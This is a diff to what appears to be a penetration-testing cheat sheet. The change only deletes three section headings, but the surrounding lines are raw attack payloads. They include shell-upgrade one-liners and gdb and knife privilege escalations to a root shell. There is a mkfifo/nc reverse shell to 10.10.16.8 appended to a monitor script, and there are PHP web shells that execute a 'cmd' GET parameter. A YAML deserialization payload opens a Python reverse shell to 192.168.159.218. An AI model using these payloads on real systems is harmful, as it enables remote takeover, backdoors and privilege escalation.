@@ -4,7 +4,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 /bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "bash", "-p")' -ex quit
 ```
-unified - terminal
+
 ```
 script /dev/null -c bash
 
@@ -17,7 +17,7 @@ sudo /usr/bin/knife exec -E 'system("/bin/bash")'
 
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 33 >/tmp/f' | tee -a monitor.sh
 ```
-php
+
 ```
 <?php echo system($_GET['cmd']); ?>
 echo '<?php system($_GET["cmd"]); ?>' > web_shell.php
@@ -27,7 +27,7 @@ system($_GET['cmd']);
 $resultado = system($_GET['cmd']);
 <h1 class="page-title"><?= $resultado ?></h1>
 ```
-yaml
+
 ```bash
 - !!python/object/apply:subprocess.Popen
   - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.159.218',333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"]
